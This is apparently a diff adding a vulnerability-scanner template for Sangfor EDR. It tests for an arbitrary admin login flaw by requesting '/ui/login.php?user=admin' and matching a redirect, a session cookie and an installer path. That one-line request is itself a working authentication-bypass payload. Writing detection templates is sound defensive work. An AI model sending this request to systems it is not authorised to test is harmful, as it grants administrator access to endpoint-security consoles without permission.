@@ -1,0 +1,28 @@
+id: sangfor-edr-arbitrary-admin-login
+info:
+  name: "深信服EDR登录.php任意管理员登录漏洞"
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 深信服
+  reference: []
+  description: |
+    This template checks for arbitrary admin login vulnerability in Sangfor EDR systems.
+
+http:
+  - method: GET
+    path:
+      - "/ui/login.php?user=admin"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "/download/edr_installer_"
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie"
